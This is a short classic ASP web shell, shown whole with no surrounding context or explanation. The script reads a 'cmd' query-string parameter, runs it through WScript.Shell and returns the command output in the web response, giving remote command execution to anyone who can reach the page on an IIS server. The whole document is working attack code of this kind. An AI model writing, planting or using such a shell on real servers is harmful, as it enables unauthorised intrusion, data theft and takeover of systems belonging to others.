<%
command = Request.QueryString("cmd")
Set objShell = Server.CreateObject("WScript.Shell")
Set objExec = objShell.Exec(command)
output = objExec.StdOut.ReadAll()
Response.Write(output)
%>